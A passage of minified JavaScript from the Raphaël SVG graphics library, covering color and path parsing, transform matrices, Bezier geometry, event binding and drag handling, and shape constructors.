c,d,e,f,h,i,j,k=b.match(L);if(k){k[2]&&(f=R(k[2].substring(5),16),e=R(k[2].substring(3,5),16),d=R(k[2].substring(1,3),16)),k[3]&&(f=R((i=k[3].charAt(3))+i,16),e=R((i=k[3].charAt(2))+i,16),d=R((i=k[3].charAt(1))+i,16)),k[4]&&(j=k[4][s](W),d=Q(j[0]),j[0].slice(-1)=="%"&&(d*=2.55),e=Q(j[1]),j[1].slice(-1)=="%"&&(e*=2.55),f=Q(j[2]),j[2].slice(-1)=="%"&&(f*=2.55),k[1].toLowerCase().slice(0,4)=="rgba"&&(h=Q(j[3])),j[3]&&j[3].slice(-1)=="%"&&(h/=100));if(k[5]){j=k[5][s](W),d=Q(j[0]),j[0].slice(-1)=="%"&&(d*=2.55),e=Q(j[1]),j[1].slice(-1)=="%"&&(e*=2.55),f=Q(j[2]),j[2].slice(-1)=="%"&&(f*=2.55),(j[0].slice(-3)=="deg"||j[0].slice(-1)=="°")&&(d/=360),k[1].toLowerCase().slice(0,4)=="hsba"&&(h=Q(j[3])),j[3]&&j[3].slice(-1)=="%"&&(h/=100);return a.hsb2rgb(d,e,f,h)}if(k[6]){j=k[6][s](W),d=Q(j[0]),j[0].slice(-1)=="%"&&(d*=2.55),e=Q(j[1]),j[1].slice(-1)=="%"&&(e*=2.55),f=Q(j[2]),j[2].slice(-1)=="%"&&(f*=2.55),(j[0].slice(-3)=="deg"||j[0].slice(-1)=="°")&&(d/=360),k[1].toLowerCase().slice(0,4)=="hsla"&&(h=Q(j[3])),j[3]&&j[3].slice(-1)=="%"&&(h/=100);return a.hsl2rgb(d,e,f,h)}k={r:d,g:e,b:f,toString:bx},k.hex="#"+(16777216|f|e<<8|d<<16).toString(16).slice(1),a.is(h,"finite")&&(k.opacity=h);return k}return{r:-1,g:-1,b:-1,hex:"none",error:1,toString:bx}},a),a.hsb=bv(function(b,c,d){return a.hsb2rgb(b,c,d).hex}),a.hsl=bv(function(b,c,d){return a.hsl2rgb(b,c,d).hex}),a.rgb=bv(function(a,b,c){return"#"+(16777216|c|b<<8|a<<16).toString(16).slice(1)}),a.getColor=function(a){var b=this.getColor.start=this.getColor.start||{h:0,s:1,b:a||.75},c=this.hsb2rgb(b.h,b.s,b.b);b.h+=.075,b.h>1&&(b.h=0,b.s-=.2,b.s<=0&&(this.getColor.start={h:0,s:1,b:b.b}));return c.hex},a.getColor.reset=function(){delete this.start},a.parsePathString=function(b){if(!b)return null;var c=bz(b);if(c.arr)return bJ(c.arr);var d={a:7,c:6,h:1,l:2,m:2,r:4,q:4,s:4,t:2,v:1,z:0},e=[];a.is(b,E)&&a.is(b[0],E)&&(e=bJ(b)),e.length||r(b).replace(Z,function(a,b,c){var f=[],g=b.toLowerCase();c.replace(_,function(a,b){b&&f.push(+b)}),g=="m"&&f.length>2&&(e.push([b][n](f.splice(0,2))),g="l",b=b=="m"?"l":"L");if(g=="r")e.push([b][n](f));else while(f.length>=d[g]){e.push([b][n](f.splice(0,d[g])));if(!d[g])break}}),e.toString=a._path2string,c.arr=bJ(e);return e},a.parseTransformString=bv(function(b){if(!b)return null;var c={r:3,s:4,t:2,m:6},d=[];a.is(b,E)&&a.is(b[0],E)&&(d=bJ(b)),d.length||r(b).replace($,function(a,b,c){var e=[],f=v.call(b);c.replace(_,function(a,b){b&&e.push(+b)}),d.push([b][n](e))}),d.toString=a._path2string;return d});var bz=function(a){var b=bz.ps=bz.ps||{};b[a]?b[a].sleep=100:b[a]={sleep:100},setTimeout(function(){for(var c in b)b[g](c)&&c!=a&&(b[c].sleep--,!b[c].sleep&&delete b[c])});return b[a]};a.findDotsAtSegment=function(a,b,c,d,e,f,g,h,i){var j=1-i,k=A(j,3),l=A(j,2),m=i*i,n=m*i,o=k*a+l*3*i*c+j*3*i*i*e+n*g,p=k*b+l*3*i*d+j*3*i*i*f+n*h,q=a+2*i*(c-a)+m*(e-2*c+a),r=b+2*i*(d-b)+m*(f-2*d+b),s=c+2*i*(e-c)+m*(g-2*e+c),t=d+2*i*(f-d)+m*(h-2*f+d),u=j*a+i*c,v=j*b+i*d,x=j*e+i*g,y=j*f+i*h,z=90-w.atan2(q-s,r-t)*180/B;(q>s||r<t)&&(z+=180);return{x:o,y:p,m:{x:q,y:r},n:{x:s,y:t},start:{x:u,y:v},end:{x:x,y:y},alpha:z}},a.bezierBBox=function(b,c,d,e,f,g,h,i){a.is(b,"array")||(b=[b,c,d,e,f,g,h,i]);var j=bQ.apply(null,b);return{x:j.min.x,y:j.min.y,x2:j.max.x,y2:j.max.y,width:j.max.x-j.min.x,height:j.max.y-j.min.y}},a.isPointInsideBBox=function(a,b,c){return b>=a.x&&b<=a.x2&&c>=a.y&&c<=a.y2},a.isBBoxIntersect=function(b,c){var d=a.isPointInsideBBox;return d(c,b.x,b.y)||d(c,b.x2,b.y)||d(c,b.x,b.y2)||d(c,b.x2,b.y2)||d(b,c.x,c.y)||d(b,c.x2,c.y)||d(b,c.x,c.y2)||d(b,c.x2,c.y2)||(b.x<c.x2&&b.x>c.x||c.x<b.x2&&c.x>b.x)&&(b.y<c.y2&&b.y>c.y||c.y<b.y2&&c.y>b.y)},a.pathIntersection=function(a,b){return bH(a,b)},a.pathIntersectionNumber=function(a,b){return bH(a,b,1)},a.isPointInsidePath=function(b,c,d){var e=a.pathBBox(b);return a.isPointInsideBBox(e,c,d)&&bH(b,[["M",c,d],["H",e.x2+10]],1)%2==1},a._removedFactory=function(a){return function(){eve("raphael.log",null,"Raphaël: you are calling to method “"+a+"” of removed object",a)}};var bI=a.pathBBox=function(a){var b=bz(a);if(b.bbox)return b.bbox;if(!a)return{x:0,y:0,width:0,height:0,x2:0,y2:0};a=bR(a);var c=0,d=0,e=[],f=[],g;for(var h=0,i=a.length;h<i;h++){g=a[h];if(g[0]=="M")c=g[1],d=g[2],e.push(c),f.push(d);else{var j=bQ(c,d,g[1],g[2],g[3],g[4],g[5],g[6]);e=e[n](j.min.x,j.max.x),f=f[n](j.min.y,j.max.y),c=g[5],d=g[6]}}var k=y[m](0,e),l=y[m](0,f),o=x[m](0,e),p=x[m](0,f),q={x:k,y:l,x2:o,y2:p,width:o-k,height:p-l};b.bbox=bm(q);return q},bJ=function(b){var c=bm(b);c.toString=a._path2string;return c},bK=a._pathToRelative=function(b){var c=bz(b);if(c.rel)return bJ(c.rel);if(!a.is(b,E)||!a.is(b&&b[0],E))b=a.parsePathString(b);var d=[],e=0,f=0,g=0,h=0,i=0;b[0][0]=="M"&&(e=b[0][1],f=b[0][2],g=e,h=f,i++,d.push(["M",e,f]));for(var j=i,k=b.length;j<k;j++){var l=d[j]=[],m=b[j];if(m[0]!=v.call(m[0])){l[0]=v.call(m[0]);switch(l[0]){case"a":l[1]=m[1],l[2]=m[2],l[3]=m[3],l[4]=m[4],l[5]=m[5],l[6]=+(m[6]-e).toFixed(3),l[7]=+(m[7]-f).toFixed(3);break;case"v":l[1]=+(m[1]-f).toFixed(3);break;case"m":g=m[1],h=m[2];default:for(var n=1,o=m.length;n<o;n++)l[n]=+(m[n]-(n%2?e:f)).toFixed(3)}}else{l=d[j]=[],m[0]=="m"&&(g=m[1]+e,h=m[2]+f);for(var p=0,q=m.length;p<q;p++)d[j][p]=m[p]}var r=d[j].length;switch(d[j][0]){case"z":e=g,f=h;break;case"h":e+=+d[j][r-1];break;case"v":f+=+d[j][r-1];break;default:e+=+d[j][r-2],f+=+d[j][r-1]}}d.toString=a._path2string,c.rel=bJ(d);return d},bL=a._pathToAbsolute=function(b){var c=bz(b);if(c.abs)return bJ(c.abs);if(!a.is(b,E)||!a.is(b&&b[0],E))b=a.parsePathString(b);if(!b||!b.length)return[["M",0,0]];var d=[],e=0,f=0,g=0,h=0,i=0;b[0][0]=="M"&&(e=+b[0][1],f=+b[0][2],g=e,h=f,i++,d[0]=["M",e,f]);var j=b.length==3&&b[0][0]=="M"&&b[1][0].toUpperCase()=="R"&&b[2][0].toUpperCase()=="Z";for(var k,l,m=i,o=b.length;m<o;m++){d.push(k=[]),l=b[m];if(l[0]!=S.call(l[0])){k[0]=S.call(l[0]);switch(k[0]){case"A":k[1]=l[1],k[2]=l[2],k[3]=l[3],k[4]=l[4],k[5]=l[5],k[6]=+(l[6]+e),k[7]=+(l[7]+f);break;case"V":k[1]=+l[1]+f;break;case"H":k[1]=+l[1]+e;break;case"R":var p=[e,f][n](l.slice(1));for(var q=2,r=p.length;q<r;q++)p[q]=+p[q]+e,p[++q]=+p[q]+f;d.pop(),d=d[n](by(p,j));break;case"M":g=+l[1]+e,h=+l[2]+f;default:for(q=1,r=l.length;q<r;q++)k[q]=+l[q]+(q%2?e:f)}}else if(l[0]=="R")p=[e,f][n](l.slice(1)),d.pop(),d=d[n](by(p,j)),k=["R"][n](l.slice(-2));else for(var s=0,t=l.length;s<t;s++)k[s]=l[s];switch(k[0]){case"Z":e=g,f=h;break;case"H":e=k[1];break;case"V":f=k[1];break;case"M":g=k[k.length-2],h=k[k.length-1];default:e=k[k.length-2],f=k[k.length-1]}}d.toString=a._path2string,c.abs=bJ(d);return d},bM=function(a,b,c,d){return[a,b,c,d,c,d]},bN=function(a,b,c,d,e,f){var g=1/3,h=2/3;return[g*a+h*c,g*b+h*d,g*e+h*c,g*f+h*d,e,f]},bO=function(a,b,c,d,e,f,g,h,i,j){var k=B*120/180,l=B/180*(+e||0),m=[],o,p=bv(function(a,b,c){var d=a*w.cos(c)-b*w.sin(c),e=a*w.sin(c)+b*w.cos(c);return{x:d,y:e}});if(!j){o=p(a,b,-l),a=o.x,b=o.y,o=p(h,i,-l),h=o.x,i=o.y;var q=w.cos(B/180*e),r=w.sin(B/180*e),t=(a-h)/2,u=(b-i)/2,v=t*t/(c*c)+u*u/(d*d);v>1&&(v=w.sqrt(v),c=v*c,d=v*d);var x=c*c,y=d*d,A=(f==g?-1:1)*w.sqrt(z((x*y-x*u*u-y*t*t)/(x*u*u+y*t*t))),C=A*c*u/d+(a+h)/2,D=A*-d*t/c+(b+i)/2,E=w.asin(((b-D)/d).toFixed(9)),F=w.asin(((i-D)/d).toFixed(9));E=a<C?B-E:E,F=h<C?B-F:F,E<0&&(E=B*2+E),F<0&&(F=B*2+F),g&&E>F&&(E=E-B*2),!g&&F>E&&(F=F-B*2)}else E=j[0],F=j[1],C=j[2],D=j[3];var G=F-E;if(z(G)>k){var H=F,I=h,J=i;F=E+k*(g&&F>E?1:-1),h=C+c*w.cos(F),i=D+d*w.sin(F),m=bO(h,i,c,d,e,0,g,I,J,[F,H,C,D])}G=F-E;var K=w.cos(E),L=w.sin(E),M=w.cos(F),N=w.sin(F),O=w.tan(G/4),P=4/3*c*O,Q=4/3*d*O,R=[a,b],S=[a+P*L,b-Q*K],T=[h+P*N,i-Q*M],U=[h,i];S[0]=2*R[0]-S[0],S[1]=2*R[1]-S[1];if(j)return[S,T,U][n](m);m=[S,T,U][n](m).join()[s](",");var V=[];for(var W=0,X=m.length;W<X;W++)V[W]=W%2?p(m[W-1],m[W],l).y:p(m[W],m[W+1],l).x;return V},bP=function(a,b,c,d,e,f,g,h,i){var j=1-i;return{x:A(j,3)*a+A(j,2)*3*i*c+j*3*i*i*e+A(i,3)*g,y:A(j,3)*b+A(j,2)*3*i*d+j*3*i*i*f+A(i,3)*h}},bQ=bv(function(a,b,c,d,e,f,g,h){var i=e-2*c+a-(g-2*e+c),j=2*(c-a)-2*(e-c),k=a-c,l=(-j+w.sqrt(j*j-4*i*k))/2/i,n=(-j-w.sqrt(j*j-4*i*k))/2/i,o=[b,h],p=[a,g],q;z(l)>"1e12"&&(l=.5),z(n)>"1e12"&&(n=.5),l>0&&l<1&&(q=bP(a,b,c,d,e,f,g,h,l),p.push(q.x),o.push(q.y)),n>0&&n<1&&(q=bP(a,b,c,d,e,f,g,h,n),p.push(q.x),o.push(q.y)),i=f-2*d+b-(h-2*f+d),j=2*(d-b)-2*(f-d),k=b-d,l=(-j+w.sqrt(j*j-4*i*k))/2/i,n=(-j-w.sqrt(j*j-4*i*k))/2/i,z(l)>"1e12"&&(l=.5),z(n)>"1e12"&&(n=.5),l>0&&l<1&&(q=bP(a,b,c,d,e,f,g,h,l),p.push(q.x),o.push(q.y)),n>0&&n<1&&(q=bP(a,b,c,d,e,f,g,h,n),p.push(q.x),o.push(q.y));return{min:{x:y[m](0,p),y:y[m](0,o)},max:{x:x[m](0,p),y:x[m](0,o)}}}),bR=a._path2curve=bv(function(a,b){var c=!b&&bz(a);if(!b&&c.curve)return bJ(c.curve);var d=bL(a),e=b&&bL(b),f={x:0,y:0,bx:0,by:0,X:0,Y:0,qx:null,qy:null},g={x:0,y:0,bx:0,by:0,X:0,Y:0,qx:null,qy:null},h=function(a,b){var c,d;if(!a)return["C",b.x,b.y,b.x,b.y,b.x,b.y];!(a[0]in{T:1,Q:1})&&(b.qx=b.qy=null);switch(a[0]){case"M":b.X=a[1],b.Y=a[2];break;case"A":a=["C"][n](bO[m](0,[b.x,b.y][n](a.slice(1))));break;case"S":c=b.x+(b.x-(b.bx||b.x)),d=b.y+(b.y-(b.by||b.y)),a=["C",c,d][n](a.slice(1));break;case"T":b.qx=b.x+(b.x-(b.qx||b.x)),b.qy=b.y+(b.y-(b.qy||b.y)),a=["C"][n](bN(b.x,b.y,b.qx,b.qy,a[1],a[2]));break;case"Q":b.qx=a[1],b.qy=a[2],a=["C"][n](bN(b.x,b.y,a[1],a[2],a[3],a[4]));break;case"L":a=["C"][n](bM(b.x,b.y,a[1],a[2]));break;case"H":a=["C"][n](bM(b.x,b.y,a[1],b.y));break;case"V":a=["C"][n](bM(b.x,b.y,b.x,a[1]));break;case"Z":a=["C"][n](bM(b.x,b.y,b.X,b.Y))}return a},i=function(a,b){if(a[b].length>7){a[b].shift();var c=a[b];while(c.length)a.splice(b++,0,["C"][n](c.splice(0,6)));a.splice(b,1),l=x(d.length,e&&e.length||0)}},j=function(a,b,c,f,g){a&&b&&a[g][0]=="M"&&b[g][0]!="M"&&(b.splice(g,0,["M",f.x,f.y]),c.bx=0,c.by=0,c.x=a[g][1],c.y=a[g][2],l=x(d.length,e&&e.length||0))};for(var k=0,l=x(d.length,e&&e.length||0);k<l;k++){d[k]=h(d[k],f),i(d,k),e&&(e[k]=h(e[k],g)),e&&i(e,k),j(d,e,f,g,k),j(e,d,g,f,k);var o=d[k],p=e&&e[k],q=o.length,r=e&&p.length;f.x=o[q-2],f.y=o[q-1],f.bx=Q(o[q-4])||f.x,f.by=Q(o[q-3])||f.y,g.bx=e&&(Q(p[r-4])||g.x),g.by=e&&(Q(p[r-3])||g.y),g.x=e&&p[r-2],g.y=e&&p[r-1]}e||(c.curve=bJ(d));return e?[d,e]:d},null,bJ),bS=a._parseDots=bv(function(b){var c=[];for(var d=0,e=b.length;d<e;d++){var f={},g=b[d].match(/^([^:]*):?([\d\.]*)/);f.color=a.getRGB(g[1]);if(f.color.error)return null;f.color=f.color.hex,g[2]&&(f.offset=g[2]+"%"),c.push(f)}for(d=1,e=c.length-1;d<e;d++)if(!c[d].offset){var h=Q(c[d-1].offset||0),i=0;for(var j=d+1;j<e;j++)if(c[j].offset){i=c[j].offset;break}i||(i=100,j=e),i=Q(i);var k=(i-h)/(j-d+1);for(;d<j;d++)h+=k,c[d].offset=h+"%"}return c}),bT=a._tear=function(a,b){a==b.top&&(b.top=a.prev),a==b.bottom&&(b.bottom=a.next),a.next&&(a.next.prev=a.prev),a.prev&&(a.prev.next=a.next)},bU=a._tofront=function(a,b){b.top!==a&&(bT(a,b),a.next=null,a.prev=b.top,b.top.next=a,b.top=a)},bV=a._toback=function(a,b){b.bottom!==a&&(bT(a,b),a.next=b.bottom,a.prev=null,b.bottom.prev=a,b.bottom=a)},bW=a._insertafter=function(a,b,c){bT(a,c),b==c.top&&(c.top=a),b.next&&(b.next.prev=a),a.next=b.next,a.prev=b,b.next=a},bX=a._insertbefore=function(a,b,c){bT(a,c),b==c.bottom&&(c.bottom=a),b.prev&&(b.prev.next=a),a.prev=b.prev,b.prev=a,a.next=b},bY=a.toMatrix=function(a,b){var c=bI(a),d={_:{transform:p},getBBox:function(){return c}};b$(d,b);return d.matrix},bZ=a.transformPath=function(a,b){return bj(a,bY(a,b))},b$=a._extractTransform=function(b,c){if(c==null)return b._.transform;c=r(c).replace(/\.{3}|\u2026/g,b._.transform||p);var d=a.parseTransformString(c),e=0,f=0,g=0,h=1,i=1,j=b._,k=new cb;j.transform=d||[];if(d)for(var l=0,m=d.length;l<m;l++){var n=d[l],o=n.length,q=r(n[0]).toLowerCase(),s=n[0]!=q,t=s?k.invert():0,u,v,w,x,y;q=="t"&&o==3?s?(u=t.x(0,0),v=t.y(0,0),w=t.x(n[1],n[2]),x=t.y(n[1],n[2]),k.translate(w-u,x-v)):k.translate(n[1],n[2]):q=="r"?o==2?(y=y||b.getBBox(1),k.rotate(n[1],y.x+y.width/2,y.y+y.height/2),e+=n[1]):o==4&&(s?(w=t.x(n[2],n[3]),x=t.y(n[2],n[3]),k.rotate(n[1],w,x)):k.rotate(n[1],n[2],n[3]),e+=n[1]):q=="s"?o==2||o==3?(y=y||b.getBBox(1),k.scale(n[1],n[o-1],y.x+y.width/2,y.y+y.height/2),h*=n[1],i*=n[o-1]):o==5&&(s?(w=t.x(n[3],n[4]),x=t.y(n[3],n[4]),k.scale(n[1],n[2],w,x)):k.scale(n[1],n[2],n[3],n[4]),h*=n[1],i*=n[2]):q=="m"&&o==7&&k.add(n[1],n[2],n[3],n[4],n[5],n[6]),j.dirtyT=1,b.matrix=k}b.matrix=k,j.sx=h,j.sy=i,j.deg=e,j.dx=f=k.e,j.dy=g=k.f,h==1&&i==1&&!e&&j.bbox?(j.bbox.x+=+f,j.bbox.y+=+g):j.dirtyT=1},b_=function(a){var b=a[0];switch(b.toLowerCase()){case"t":return[b,0,0];case"m":return[b,1,0,0,1,0,0];case"r":return a.length==4?[b,0,a[2],a[3]]:[b,0];case"s":return a.length==5?[b,1,1,a[3],a[4]]:a.length==3?[b,1,1]:[b,1]}},ca=a._equaliseTransform=function(b,c){c=r(c).replace(/\.{3}|\u2026/g,b),b=a.parseTransformString(b)||[],c=a.parseTransformString(c)||[];var d=x(b.length,c.length),e=[],f=[],g=0,h,i,j,k;for(;g<d;g++){j=b[g]||b_(c[g]),k=c[g]||b_(j);if(j[0]!=k[0]||j[0].toLowerCase()=="r"&&(j[2]!=k[2]||j[3]!=k[3])||j[0].toLowerCase()=="s"&&(j[3]!=k[3]||j[4]!=k[4]))return;e[g]=[],f[g]=[];for(h=0,i=x(j.length,k.length);h<i;h++)h in j&&(e[g][h]=j[h]),h in k&&(f[g][h]=k[h])}return{from:e,to:f}};a._getContainer=function(b,c,d,e){var f;f=e==null&&!a.is(b,"object")?h.doc.getElementById(b):b;if(f!=null){if(f.tagName)return c==null?{container:f,width:f.style.pixelWidth||f.offsetWidth,height:f.style.pixelHeight||f.offsetHeight}:{container:f,width:c,height:d};return{container:1,x:b,y:c,width:d,height:e}}},a.pathToRelative=bK,a._engine={},a.path2curve=bR,a.matrix=function(a,b,c,d,e,f){return new cb(a,b,c,d,e,f)},function(b){function d(a){var b=w.sqrt(c(a));a[0]&&(a[0]/=b),a[1]&&(a[1]/=b)}function c(a){return a[0]*a[0]+a[1]*a[1]}b.add=function(a,b,c,d,e,f){var g=[[],[],[]],h=[[this.a,this.c,this.e],[this.b,this.d,this.f],[0,0,1]],i=[[a,c,e],[b,d,f],[0,0,1]],j,k,l,m;a&&a instanceof cb&&(i=[[a.a,a.c,a.e],[a.b,a.d,a.f],[0,0,1]]);for(j=0;j<3;j++)for(k=0;k<3;k++){m=0;for(l=0;l<3;l++)m+=h[j][l]*i[l][k];g[j][k]=m}this.a=g[0][0],this.b=g[1][0],this.c=g[0][1],this.d=g[1][1],this.e=g[0][2],this.f=g[1][2]},b.invert=function(){var a=this,b=a.a*a.d-a.b*a.c;return new cb(a.d/b,-a.b/b,-a.c/b,a.a/b,(a.c*a.f-a.d*a.e)/b,(a.b*a.e-a.a*a.f)/b)},b.clone=function(){return new cb(this.a,this.b,this.c,this.d,this.e,this.f)},b.translate=function(a,b){this.add(1,0,0,1,a,b)},b.scale=function(a,b,c,d){b==null&&(b=a),(c||d)&&this.add(1,0,0,1,c,d),this.add(a,0,0,b,0,0),(c||d)&&this.add(1,0,0,1,-c,-d)},b.rotate=function(b,c,d){b=a.rad(b),c=c||0,d=d||0;var e=+w.cos(b).toFixed(9),f=+w.sin(b).toFixed(9);this.add(e,f,-f,e,c,d),this.add(1,0,0,1,-c,-d)},b.x=function(a,b){return a*this.a+b*this.c+this.e},b.y=function(a,b){return a*this.b+b*this.d+this.f},b.get=function(a){return+this[r.fromCharCode(97+a)].toFixed(4)},b.toString=function(){return a.svg?"matrix("+[this.get(0),this.get(1),this.get(2),this.get(3),this.get(4),this.get(5)].join()+")":[this.get(0),this.get(2),this.get(1),this.get(3),0,0].join()},b.toFilter=function(){return"progid:DXImageTransform.Microsoft.Matrix(M11="+this.get(0)+", M12="+this.get(2)+", M21="+this.get(1)+", M22="+this.get(3)+", Dx="+this.get(4)+", Dy="+this.get(5)+", sizingmethod='auto expand')"},b.offset=function(){return[this.e.toFixed(4),this.f.toFixed(4)]},b.split=function(){var b={};b.dx=this.e,b.dy=this.f;var e=[[this.a,this.c],[this.b,this.d]];b.scalex=w.sqrt(c(e[0])),d(e[0]),b.shear=e[0][0]*e[1][0]+e[0][1]*e[1][1],e[1]=[e[1][0]-e[0][0]*b.shear,e[1][1]-e[0][1]*b.shear],b.scaley=w.sqrt(c(e[1])),d(e[1]),b.shear/=b.scaley;var f=-e[0][1],g=e[1][1];g<0?(b.rotate=a.deg(w.acos(g)),f<0&&(b.rotate=360-b.rotate)):b.rotate=a.deg(w.asin(f)),b.isSimple=!+b.shear.toFixed(9)&&(b.scalex.toFixed(9)==b.scaley.toFixed(9)||!b.rotate),b.isSuperSimple=!+b.shear.toFixed(9)&&b.scalex.toFixed(9)==b.scaley.toFixed(9)&&!b.rotate,b.noRotation=!+b.shear.toFixed(9)&&!b.rotate;return b},b.toTransformString=function(a){var b=a||this[s]();if(b.isSimple){b.scalex=+b.scalex.toFixed(4),b.scaley=+b.scaley.toFixed(4),b.rotate=+b.rotate.toFixed(4);return(b.dx||b.dy?"t"+[b.dx,b.dy]:p)+(b.scalex!=1||b.scaley!=1?"s"+[b.scalex,b.scaley,0,0]:p)+(b.rotate?"r"+[b.rotate,0,0]:p)}return"m"+[this.get(0),this.get(1),this.get(2),this.get(3),this.get(4),this.get(5)]}}(cb.prototype);var cc=navigator.userAgent.match(/Version\/(.*?)\s/)||navigator.userAgent.match(/Chrome\/(\d+)/);navigator.vendor=="Apple Computer, Inc."&&(cc&&cc[1]<4||navigator.platform.slice(0,2)=="iP")||navigator.vendor=="Google Inc."&&cc&&cc[1]<8?k.safari=function(){var a=this.rect(-99,-99,this.width+99,this.height+99).attr({stroke:"none"});setTimeout(function(){a.remove()})}:k.safari=be;var cd=function(){this.returnValue=!1},ce=function(){return this.originalEvent.preventDefault()},cf=function(){this.cancelBubble=!0},cg=function(){return this.originalEvent.stopPropagation()},ch=function(){if(h.doc.addEventListener)return function(a,b,c,d){var e=o&&u[b]?u[b]:b,f=function(e){var f=h.doc.documentElement.scrollTop||h.doc.body.scrollTop,i=h.doc.documentElement.scrollLeft||h.doc.body.scrollLeft,j=e.clientX+i,k=e.clientY+f;if(o&&u[g](b))for(var l=0,m=e.targetTouches&&e.targetTouches.length;l<m;l++)if(e.targetTouches[l].target==a){var n=e;e=e.targetTouches[l],e.originalEvent=n,e.preventDefault=ce,e.stopPropagation=cg;break}return c.call(d,e,j,k)};a.addEventListener(e,f,!1);return function(){a.removeEventListener(e,f,!1);return!0}};if(h.doc.attachEvent)return function(a,b,c,d){var e=function(a){a=a||h.win.event;var b=h.doc.documentElement.scrollTop||h.doc.body.scrollTop,e=h.doc.documentElement.scrollLeft||h.doc.body.scrollLeft,f=a.clientX+e,g=a.clientY+b;a.preventDefault=a.preventDefault||cd,a.stopPropagation=a.stopPropagation||cf;return c.call(d,a,f,g)};a.attachEvent("on"+b,e);var f=function(){a.detachEvent("on"+b,e);return!0};return f}}(),ci=[],cj=function(a){var b=a.clientX,c=a.clientY,d=h.doc.documentElement.scrollTop||h.doc.body.scrollTop,e=h.doc.documentElement.scrollLeft||h.doc.body.scrollLeft,f,g=ci.length;while(g--){f=ci[g];if(o){var i=a.touches.length,j;while(i--){j=a.touches[i];if(j.identifier==f.el._drag.id){b=j.clientX,c=j.clientY,(a.originalEvent?a.originalEvent:a).preventDefault();break}}}else a.preventDefault();var k=f.el.node,l,m=k.nextSibling,n=k.parentNode,p=k.style.display;h.win.opera&&n.removeChild(k),k.style.display="none",l=f.el.paper.getElementByPoint(b,c),k.style.display=p,h.win.opera&&(m?n.insertBefore(k,m):n.appendChild(k)),l&&eve("raphael.drag.over."+f.el.id,f.el,l),b+=e,c+=d,eve("raphael.drag.move."+f.el.id,f.move_scope||f.el,b-f.el._drag.x,c-f.el._drag.y,b,c,a)}},ck=function(b){a.unmousemove(cj).unmouseup(ck);var c=ci.length,d;while(c--)d=ci[c],d.el._drag={},eve("raphael.drag.end."+d.el.id,d.end_scope||d.start_scope||d.move_scope||d.el,b);ci=[]},cl=a.el={};for(var cm=t.length;cm--;)(function(b){a[b]=cl[b]=function(c,d){a.is(c,"function")&&(this.events=this.events||[],this.events.push({name:b,f:c,unbind:ch(this.shape||this.node||h.doc,b,c,d||this)}));return this},a["un"+b]=cl["un"+b]=function(a){var c=this.events||[],d=c.length;while(d--)if(c[d].name==b&&c[d].f==a){c[d].unbind(),c.splice(d,1),!c.length&&delete this.events;return this}return this}})(t[cm]);cl.data=function(b,c){var d=bb[this.id]=bb[this.id]||{};if(arguments.length==1){if(a.is(b,"object")){for(var e in b)b[g](e)&&this.data(e,b[e]);return this}eve("raphael.data.get."+this.id,this,d[b],b);return d[b]}d[b]=c,eve("raphael.data.set."+this.id,this,c,b);return this},cl.removeData=function(a){a==null?bb[this.id]={}:bb[this.id]&&delete bb[this.id][a];return this},cl.hover=function(a,b,c,d){return this.mouseover(a,c).mouseout(b,d||c)},cl.unhover=function(a,b){return this.unmouseover(a).unmouseout(b)};var cn=[];cl.drag=function(b,c,d,e,f,g){function i(i){(i.originalEvent||i).preventDefault();var j=h.doc.documentElement.scrollTop||h.doc.body.scrollTop,k=h.doc.documentElement.scrollLeft||h.doc.body.scrollLeft;this._drag.x=i.clientX+k,this._drag.y=i.clientY+j,this._drag.id=i.identifier,!ci.length&&a.mousemove(cj).mouseup(ck),ci.push({el:this,move_scope:e,start_scope:f,end_scope:g}),c&&eve.on("raphael.drag.start."+this.id,c),b&&eve.on("raphael.drag.move."+this.id,b),d&&eve.on("raphael.drag.end."+this.id,d),eve("raphael.drag.start."+this.id,f||e||this,i.clientX+k,i.clientY+j,i)}this._drag={},cn.push({el:this,start:i}),this.mousedown(i);return this},cl.onDragOver=function(a){a?eve.on("raphael.drag.over."+this.id,a):eve.unbind("raphael.drag.over."+this.id)},cl.undrag=function(){var b=cn.length;while(b--)cn[b].el==this&&(this.unmousedown(cn[b].start),cn.splice(b,1),eve.unbind("raphael.drag.*."+this.id));!cn.length&&a.unmousemove(cj).unmouseup(ck)},k.circle=function(b,c,d){var e=a._engine.circle(this,b||0,c||0,d||0);this.__set__&&this.__set__.push(e);return e},k.rect=function(b,c,d,e,f){var g=a._engine.rect(this,b||0,c||0,d||0,e||0,f||0);this.__set__&&this.__set__.push(g);return g},k.ellipse=function(b,c,d,e){var f=a._engine.ellipse(this,b||0,c||0,d||0,e||0);this.__set__&&this.__set__.push(f);return f},k.path=function(b){b&&!a.is(b,D)&&!a.is(b[0],E)&&(b+=p);var c=a._engine.path(a.format[m](a,arguments),this);this.__set__&&this.__set__.push(c);return c},k.image=function(b,c,d,e,f){var g=a._engine.image(this,b||"about:blank",c||0,d||0,e||0,f||0);this.__set__&&this.__set__.push(g);return g},k.text=function(b,c,d){var e=a._engine.text(this,b||0,c||0,r(d));this.__set__&&this.__set__.push(e);return e},k.set=function(b){!a.is(b,"array")&&(b=Array.prototype.splice.call(arguments,0,arguments.length));var c=new cG(b);this.__set__&&this.__set__.push(c);return c},k.setStart=function(a){this.__set__=a||this.set()},k.setFinish=function(a){var b=this.__set__;delete this.__set__;return b},k.setSize=function(b,c){return a._engine.setSize.call(this,b,c)},k.setViewBox=function(b,c,d,e,f){return a._engine.setViewBox.call(this,b,c,d,e,f)},k.top=k.bottom=null,k.raphael=a;var co=function(a){var b=a.getBoundingClientRect(),c=a.ownerDocument,d=c.body,e=c.documentElement,f=e.clientTop||d.clientTop||0,g=e.clientLeft||d.clientLeft||0,i=b.top+(h.win.pageYOffset||e.scrollTop||d.scrollTop)-f,j=b.left+(h.win.pageXOffset||e.scrollLeft||d.scrollLeft)-g;return{y:i,x:j}};k.getElementByPoint=function(a,b){var c=this,d=c.canvas,e=h.doc.elementFromPoint(a,b);if(h.win.opera&&e.tagName=="svg"){var f=co(d),g=d.createSVGRect();g.x=a-f.x,g.y=b-f.y,g.width=g.height=1;var i=d.getIntersectionList(g,null);i.length&&(e=i[i.length-1])}if(!e)return null;while(e.parentNode&&e!=d.parentNode&&!e.raphael)e=e.parentNode;e==c.canvas.parentNode&&(e=d),e=e&&e.raphael?c.getById(e.raphaelid):null;return e},k.getById=function(a){var b=this.bottom;while(b){if(b.id==a)return b;b=b.next}return null},k.forEach=function(a,b){var c=this.bottom;while(c){if(a.call(b,c)===!1)return this;c=c.next}return this},k.getElementsByPoint=function(a,b){var c=this.set();this.forEach(function(d){d.isPointInside(a,b)&&c.push(d)});return c},cl.isPointInside=function(b,c){var d=this.realPath=this.realPath||bi[this.type](this);return 